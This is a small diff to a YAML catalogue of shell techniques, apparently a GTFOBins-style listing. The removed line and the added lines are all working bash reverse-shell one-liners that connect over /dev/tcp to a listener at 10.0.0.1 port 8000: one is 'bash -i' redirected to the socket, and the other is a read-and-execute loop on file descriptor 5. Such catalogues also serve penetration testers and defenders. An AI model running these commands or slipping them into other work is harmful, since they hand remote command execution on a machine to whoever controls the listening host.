@@ -37,5 +37,9 @@ functions:
       code: |
         RHOST=10.0.0.1
         RPORT=8000
-        exec 5<&-;exec 5<>/dev/tcp/$RHOST/$RPORT;while read line 0<&5; do $line 2>&5 >&5; done
+        bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
+    - code: |
+        RHOST=10.0.0.1
+        RPORT=8000
+        exec 5<&-;exec 5<>/dev/tcp/$RHOST/$RPORT; while read line 0<&5; do $line 2>&5 >&5; done
 ---
